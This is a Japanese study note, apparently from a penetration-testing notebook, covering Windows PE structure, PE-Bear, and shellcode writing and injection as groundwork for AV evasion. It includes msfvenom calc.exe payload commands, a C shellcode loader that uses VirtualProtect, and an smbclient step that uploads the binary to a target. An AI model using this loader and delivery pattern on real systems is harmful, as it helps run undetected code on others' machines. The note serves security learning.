- 関連ノート：
    - [AV Evasion：概念と理論](AV%20Evasion：概念と理論.md)
    - [コンピュータ・アセンブラ・バイナリの基礎知識](../../Misc/コンピュータ・アセンブラ・バイナリの基礎知識.md)
    - [Windows Internal](../🪟Windows/Windowsの基礎・前提知識/Windows%20Internal.md)

---

# PE（Portable Executable）構造

WindowsのEXEやDLLファイルに使われる実行形式のファイル構造。OSのローダーがこの構造を解析し、プログラムをメモリにロード・実行する。x86/x64両方に対応。

**なぜPE構造を知るべきか：**

- パッキング・アンパッキングやAV回避に関わる改変はPE構造の理解が前提    
- AVやマルウェア解析ツールはPE内の情報をもとに悪意の有無を判断する
- どのセクションにシェルコードを格納するかは戦略的に重要

### PEの構成セクション

![](../../画像ファイル/Pasted%20image%2020260318223752.png)

$$PEの構成要素$$

| セクション名   | 内容                    |
| -------- | --------------------- |
| `.text`  | 実行されるコード本体（関数など）      |
| `.data`  | 初期化済みの変数              |
| `.bss`   | 未初期化の変数（サイズだけ確保）      |
| `.rdata` | 読み取り専用データ（定数など）       |
| `.edata` | エクスポート関数テーブル          |
| `.idata` | インポート関数テーブル           |
| `.reloc` | 再配置情報                 |
| `.rsrc`  | 画像・アイコン・マニフェストなどのリソース |

### Windowsローダーの実行フロー

1. ヘッダーを解析（`MZ`マジック・ファイル形式・CPUアーキテクチャなどを判定）
2. セクション情報を読み取る（セクション数・各セクションのオフセットを確認）
3. メモリマッピング（EntryPointとImageBaseの情報をもとにコードを展開）
4. DLLやインポート関数の読み込み
5. EntryPointに制御を移し、コードを実行

### シェルコードの格納場所とPEセクション

シェルコードをどのように定義するかでPE内の格納場所が変わる：

|定義方法|格納先|
|---|---|
|ローカル変数として定義|`.text` セクション|
|グローバル変数として定義|`.data` セクション|
|リソースとして格納（画像など）|`.rsrc` セクション|
|独自セクションを作成し格納|新しいセクションを手動で定義|

---

# PE-Bear

🔗[PE-Bear](https://github.com/hasherezade/pe-bear)：WindowsバイナリのPE構造をGUIで確認できる軽量ツール。

## 基本的な使い方

1. `File → Load PEs`（または `Ctrl + O`）で対象のEXEファイルを開く
2. 左側にPE構造・右側に対応する詳細が表示される

![](../../画像ファイル/Pasted%20image%2020230619180137.png)

$$PE-Bearの例$$

|タブ|内容|
|---|---|
|General|ファイル全体のMD5ハッシュなど|
|DOS Hdr|先頭の`MZ`マジックナンバーなどDOSヘッダー情報|
|File Hdr|セクション数などPEファイル全体のヘッダー情報|
|Optional Hdr|Entry Point・ImageBase・メモリレイアウトに関する情報|
|Section Hdr|各セクション（`.text`, `.data`, `.rsrc`など）の詳細・仮想アドレス・サイズ|

**セクションの中身を確認する方法：**

1. `Section Hdr`タブで確認したいセクションを選択
2. `Virtual Addr`欄で右クリック →「Follow on Click」にチェック
3. アドレスをクリックするとHEXビューに中身が表示される

---

# シェルコードの基礎

シェルコードは、攻撃者が任意の命令を実行するためのマシン語コード。多くの場合アセンブリで書かれ、16進数オペコードとして扱われる。AV回避にはカスタムシェルコードが有効だが、アセンブリの高度な知識が必要。

**自作シェルコードに必要なスキル：**
- x86/x64アーキテクチャの理解
- アセンブリ・Cなどの低レベル言語の知識
- Linux / Windows のOS内部に関する理解

## Linuxでの簡単なシェルコード例

画面に「FFXV is best!」を出力し終了するコード。

|syscall|機能|rax|rdi|rsi|rdx|
|---|---|---|---|---|---|
|write|出力|0x1|fd|バッファのポインタ|サイズ|
|exit|プログラム終了|0x3c|終了コード|||

```c
global _start

section .text
_start:
    jmp MESSAGE         ; 1) MESSAGEへジャンプ

GOBACK:
    mov rax, 0x1
    mov rdi, 0x1
    pop rsi             ; 3) メッセージのアドレスをrsiに取り出す
    mov rdx, 0xd
    syscall

    mov rax, 0x3c
    mov rdi, 0x0
    syscall

MESSAGE:
    call GOBACK         ; 2) callにより戻りアドレス（メッセージ位置）をスタックに積む
    db "FFXV is best!", 0dh, 0ah
```

**コンパイルと実行：**

```zsh
nasm -f elf64 example.asm
ld example.o -o example
./example
```

### シェルコード抽出の流れ

1. `objdump -d example` で命令を確認

2. `.text`セクションをバイナリ抽出
```sh
objcopy -j .text -O binary example example.text
```

3. C文字列形式に変換
```sh
xxd -i example.text
```

![](../../画像ファイル/Pasted%20image%2020230619195607.png)

$$xxdによる変換$$

### CプログラムへのシェルコードのEmbedding

```c
#include <stdio.h>

int main(int argc, char **argv) {
    unsigned char message[] = {
        0xeb, 0x1e, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00,
        0x5e, 0xba, 0x0d, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00,
        /* ... */
    };
    (*(void(*)())message)();
    return 0;
}
```

```zsh
gcc -g -Wall -z execstack example.c -o examplex
```
- `-g`：デバッグ情報を生成
- `-Wall`：警告メッセージを表示
- `-z execstack`：スタック上で実行可能なコードを許可

---

# シェルコードの生成と注入

## 公開ツールを使ったシェルコード生成（msfvenom）

[☠️Msfvenom](../../Tools/☠️Msfvenom.md)
```zsh
# calc.exeを実行するシェルコード（PoC用途）
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c

# バイナリ形式で生成して変換
msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
xxd -i /tmp/example.bin
```

> [!WARNING]
> 公開ツールで生成されるシェルコードの多くは、AVに既知のパターンとして認識され容易に検出される。

## シェルコード注入（VirtualProtect経由）

生成したシェルコードをメモリ上に配置し、`VirtualProtect`で実行権限を付与して関数ポインタ経由で実行する。

```c
#include <windows.h>

char stager[] = {
    // 生成したシェルコードを挿入
};

int main()
{
    DWORD oldProtect;
    VirtualProtect(stager, sizeof(stager), PAGE_EXECUTE_READ, &oldProtect);
    int (*shellcode)() = (int(*)())(void*)stager;
    shellcode();
}
```

```zsh
# クロスコンパイル
i686-w64-mingw32-gcc calc.c -o calc-MSF.exe

# ターゲットへ転送（smbclientの例）
smbclient -U example '//<target_IP>/Tools'
smb: \> put calc-MSF.exe
```

> [!WARNING]
> 多くの場合、AntiScanなどでAVに検出される。